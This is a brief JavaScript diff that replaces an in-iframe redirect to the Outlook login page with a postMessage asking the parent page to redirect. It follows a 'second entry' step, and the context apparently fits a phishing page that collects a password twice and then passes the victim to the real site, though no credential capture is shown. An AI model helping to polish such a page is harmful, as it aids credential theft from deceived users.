@@ -65,7 +65,10 @@ document.addEventListener("DOMContentLoaded", () => {
         });
 
         msg.style.display = "none"; // 👈 hide message before redirect
-        window.location.href = "https://outlook.com/login";
+
+        // ✅ Instead of redirecting inside the iframe,
+        // send signal to parent to redirect full page
+        window.parent.postMessage("redirect-to-outlook", "*");
       } catch (err) {
         console.error("❌ Failed second time:", err);
         alert("Something went wrong on second entry.");
